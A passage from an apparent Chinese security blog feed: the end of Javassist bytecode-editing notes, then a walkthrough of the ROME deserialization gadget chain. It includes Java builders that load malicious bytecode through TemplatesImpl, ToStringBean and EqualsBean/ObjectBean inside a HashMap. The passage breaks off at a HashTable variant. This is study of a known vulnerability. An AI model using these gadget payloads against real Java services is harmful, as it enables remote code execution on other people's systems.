function">replace</span><span class="token punctuation">(</span><span class="token string">"{ $_ = $1 instanceof Number; }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>修改强制类型转换</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token class-name">Cast</span> c<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span> <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.Long"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"{ $_ = (Number)$1; }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>修改异常捕捉</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token class-name">Handler</span> h<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span> <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>h<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.RuntimeException"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>h<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span><span class="token string">"{ $1.printStackTrace(); }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="替换方法体"><a href="#替换方法体" class="headerlink" title="替换方法体"></a>替换方法体</h3><p>替换方法调用</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CodeConverter</span> converter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CodeConverter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>converter<span class="token punctuation">.</span><span class="token function">redirectMethodCall</span><span class="token punctuation">(</span>print<span class="token punctuation">,</span> println<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//converter.redirectMethodCall("print", println);</span>ctMethod<span class="token punctuation">.</span><span class="token function">instrument</span><span class="token punctuation">(</span>converter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ctConstructor.instrument(converter);</span><span class="token comment">//ctClass.instrument(converter);</span></code></pre><p>替换属性读写</p><pre class="language-java" data-language="java"><code class="language-java">converter<span class="token punctuation">.</span><span class="token function">redirectFieldAccess</span><span class="token punctuation">(</span>field<span class="token punctuation">,</span> newClass<span class="token punctuation">,</span> newFieldname<span class="token punctuation">)</span><span class="token punctuation">;</span>converter<span class="token punctuation">.</span><span class="token function">replaceFieldRead</span><span class="token punctuation">(</span>field<span class="token punctuation">,</span> calledClass<span class="token punctuation">,</span> calledMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>converter<span class="token punctuation">.</span><span class="token function">replaceFieldWrite</span><span class="token punctuation">(</span>field<span class="token punctuation">,</span> calledClass<span class="token punctuation">,</span> calledMethod<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>替换新建对象</p><pre class="language-java" data-language="java"><code class="language-java">converter<span class="token punctuation">.</span><span class="token function">replaceNew</span><span class="token punctuation">(</span>oldClass<span class="token punctuation">,</span> newClass<span class="token punctuation">)</span><span class="token punctuation">;</span>converter<span class="token punctuation">.</span><span class="token function">replaceNew</span><span class="token punctuation">(</span>newClass<span class="token punctuation">,</span> calledClass<span class="token punctuation">,</span> calledMethod<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>插入方法调用</p><pre class="language-java" data-language="java"><code class="language-java">converter<span class="token punctuation">.</span><span class="token function">insertAfterMethod</span><span class="token punctuation">(</span>origMethod<span class="token punctuation">,</span> afterMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>converter<span class="token punctuation">.</span><span class="token function">insertBeforeMethod</span><span class="token punctuation">(</span>origMethod<span class="token punctuation">,</span> beforeMethod<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>替换为静态方法调用</p><pre class="language-java" data-language="java"><code class="language-java">converter<span class="token punctuation">.</span><span class="token function">redirectMethodCallToStatic</span><span class="token punctuation">(</span>origMethod<span class="token punctuation">,</span> staticMethod<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>替换数组读写为方法调用</p><pre class="language-java" data-language="java"><code class="language-java">converter<span class="token punctuation">.</span><span class="token function">replaceArrayAccess</span><span class="token punctuation">(</span>calledClass<span class="token punctuation">,</span> names<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>$0,$1, $2, …</td><td>$0 = this; $1 = args[1] …..</td></tr><tr><td>$args</td><td>方法参数数组.它的类型为 Object[]</td></tr><tr><td>$$</td><td>所有实参。例如, m($$) 等价于 m(1,2,…)</td></tr><tr><td>$cflow(…)</td><td>cflow 变量</td></tr><tr><td>$r</td><td>返回结果的类型，用于强制类型转换</td></tr><tr><td>$w</td><td>包装器类型，用于强制类型转换</td></tr><tr><td>$_</td><td>返回值</td></tr><tr><td>$sig</td><td>类型为 java.lang.Class 的参数类型数组</td></tr><tr><td>$type</td><td>一个 java.lang.Class 对象，表示返回值类型</td></tr><tr><td>$class</td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr><tr><td>$e</td><td>异常对象</td></tr></tbody></table><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>设置需要继承的类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ProxyFactory</span> factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProxyFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>factory<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span><span class="token class-name">Test</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置需要代理的方法（可选，默认全部）</p><pre class="language-java" data-language="java"><code class="language-java">factory<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MethodFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isHandled</span><span class="token punctuation">(</span><span class="token class-name">Method</span> m<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>获得代理对象</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">createClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ProxyObject</span> proxy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ProxyObject</span><span class="token punctuation">)</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置代理处理方法</p><pre class="language-java" data-language="java"><code class="language-java">proxy<span class="token punctuation">.</span><span class="token function">setHandler</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MethodHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> self<span class="token punctuation">,</span> <span class="token class-name">Method</span> thisMethod<span class="token punctuation">,</span> <span class="token class-name">Method</span> proceed<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"before "</span> <span class="token operator">+</span> thisMethod<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token keyword">return</span> proceed<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"after "</span> <span class="token operator">+</span> thisMethod<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>调用代理方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Test</span> test <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Test</span><span class="token punctuation">)</span>proxy<span class="token punctuation">;</span>test<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用JPDA动态替换类<br>只能替换当前JVM的类，不能替换远程JVM的类<br>本地启动JPDA详见 #79（相当于自己连自己）<br>替换类时必须确保当前JVM已经加载该类<br>可以修改方法体/属性默认值，但不能增加/删除方法，不能增加/删除属性</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">HotSwapper</span> swapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwapper</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>swapper<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span>ctClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用Instrument动态替换类<br>生成Agent</p><pre class="language-java" data-language="java"><code class="language-java">jshell <span class="token operator">--</span><span class="token keyword">class</span><span class="token operator">-</span>path <span class="token operator">/</span>paht<span class="token operator">/</span><span class="token keyword">to</span><span class="token operator">/</span>javassist<span class="token operator">-</span><span class="token number">3.27</span><span class="token number">.0</span><span class="token operator">-</span><span class="token constant">GA</span><span class="token punctuation">.</span>jarjshell<span class="token operator">&gt;</span> <span class="token class-name"><span class="token namespace">javassist<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>HotSwapAgent</span><span class="token punctuation">.</span><span class="token function">createAgentJarFile</span><span class="token punctuation">(</span><span class="token string">"hotswap.jar"</span><span class="token punctuation">)</span>jshell<span class="token operator">&gt;</span> <span class="token operator">/</span>exit</code></pre><p>使用Agent启动<br>Instrument详见 #111</p><p>java -javaagent:/path/to/hotswap.jar com.github.test.Test<br>动态替换<br>可以修改方法体/属性默认值，但不能增加/删除方法，不能增加/删除属性</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">HotSwapAgent</span><span class="token punctuation">.</span><span class="token function">redefine</span><span class="token punctuation">(</span><span class="token class-name">Test</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://paoka1.top/2023/04/05/Java-Javassist/">Java Javassist</a></li><li><a href="https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/">javassist基础入门笔记 - 易水风萧</a></li><li><a href="https://github.com/woshikid/blog/issues/116">Javassist学习笔记 · Issue #116 · woshikid/blog</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rome链</title>
      <link href="/2024/04/11/Rome%E9%93%BE/"/>
      <url>/2024/04/11/Rome%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="Rome反序列化"><a href="#Rome反序列化" class="headerlink" title="Rome反序列化"></a>Rome反序列化</h1><p><a name="X3E3n"></a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。<br>Rome 提供了 <strong>ToStringBean</strong> 这个类，提供深入的 toString 方法对JavaBean进行操作。</p><p><strong>漏洞原理</strong><br>漏洞核心应该是ROME框架里的<strong>com.sun.syndication.feed.impl.ToStringBean</strong>类利用反射执行了invoke方法，并且参数可控<br><img src="/img/4-11/1.png"></p><p>依赖</p><pre class="language-java" data-language="java"><code class="language-java"> <span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>     <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>rome<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>     <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>rome<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>     <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">1.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span></code></pre><p>下面是ysoserial中的利用链</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">*</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">.</span><span class="token function">beanHashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token operator">*</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">)</span></code></pre><p><a name="PmZJ6"></a></p><h3 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a>ObjectBean</h3><p>com.sun.syndication.feed.impl.ObjectBean是Rome提供的一个封装类型, 初始化时提供了一个Class类型和一个Object对象实例进行封装<br>他也有三个成员变量，分别是EqualsBean、 ToStringBean、CloneableBean类，为ObjectBean提供了equals、toString、clone以及hashCode方法<br>在ObjectBean#hashCode中，调用了EqualsBean类的beanHashCode方法 —-出自<a href="https://xz.aliyun.com/t/11200">https://xz.aliyun.com/t/11200</a><br><a name="LdJJ0"></a></p><h3 id="ToStringBean"><a href="#ToStringBean" class="headerlink" title="ToStringBean"></a>ToStringBean</h3><p>com.sun.syndication.feed.impl.ToStringBean是给对象提供toString方法的类, 类中有两个toString方法, 第一个是无参的方法, 获取调用链中上一个类或_obj属性中保存对象的类名, 并调用第二个toString方法. 在第二个toString方法中, 会调用BeanIntrospector#getPropertyDescriptors来获取_beanClass的所有getter和setter方法, 接着判断参数的长度, 长度等于0的方法会使用_obj实例进行反射调用, 通过这个点我们可以来触发TemplatesImpl的利用链. —-出自<a href="https://xz.aliyun.com/t/11200">https://xz.aliyun.com/t/11200</a></p><p><a name="shRmX"></a></p><h2 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h2><p>注意：idea调式的时候需要关闭调式器视图的自动触发toString功能<br>ROME反序列化的利用链十分类似于CC链，其后半段的TemplatesImpl.getOutputProperties()正是CC2中实现任意类加载的利用方式。入口处的HashMap.readObject()，也正好是CC6中的反序列化入口。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token class-name">TemplateImplGadget_EqualBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span><span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">EvilClassTable<span class="token punctuation">.</span>TemplateClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">EqualsBean</span> equalsBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> hashMap<span class="token punctuation">;</span><span class="token punctuation">}</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>反序列化入口：从hashmap中的readObject到hash再到hashCode方法<br>到EqualBean#hashCode中<br><img src="/img/4-11/2.png"><br>然后调用_obj的toString方法<br>再来看看ToStringBean的toString方法<br><img src="/img/4-11/3.png"><br>然后进入另一个toString方法<br><img src="/img/4-11/4.png"><br>进入BeanIntrospector#getPropertyDescriptors中<br><img src="/img/4-11/5.png"><br>然后是进入getPDs方法，这里就会获取到getter和setter方法，再包装进入PropertyDescriptor就不细看了<br>这里的类是Template所以只会拿到getOutputProperties方法<br><img src="/img/4-11/6.png"><br>然后invoke拿到的方法<br><img src="/img/4-11/7.png"></p><p>然后就是走到TemplateImpl加载恶意字节码的流程<br><img src="/img/4-11/8.png"><br>会在newTransformer()中根据字节数组加载成class,再调用Class的newInstance，执行静态代码块<br><a name="zZrC8"></a></p><h2 id="其他利用链"><a href="#其他利用链" class="headerlink" title="其他利用链"></a>其他利用链</h2><p><a name="Puokw"></a></p><h3 id="ObjectBean利用链"><a href="#ObjectBean利用链" class="headerlink" title="ObjectBean利用链"></a>ObjectBean利用链</h3><p>（等效链，可忽略）<br>本质还是不变<br><img src="/img/4-11/9.png"><br>ObjectBean中的hashCode与上面方法 等效<br><img src="/img/4-11/10.png"><br>构造方法都一样，只需将EqualBean改为ObjectBean即可</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token class-name">TemplateImplGadget_ObjectBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span><span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">EvilClassTable<span class="token punctuation">.</span>TemplateClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ObjectBean</span> objectBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> hashMap<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Reflect</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> source<span class="token punctuation">,</span><span class="token class-name">String</span> fieldName<span class="token punctuation">,</span><span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span><span class="token class-name">Field</span> field<span class="token operator">=</span>source<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><a name="ZI1Zk"></a></p><h3 id="HashTable利用链"><a href="#HashTable利用链" class="headerlink" 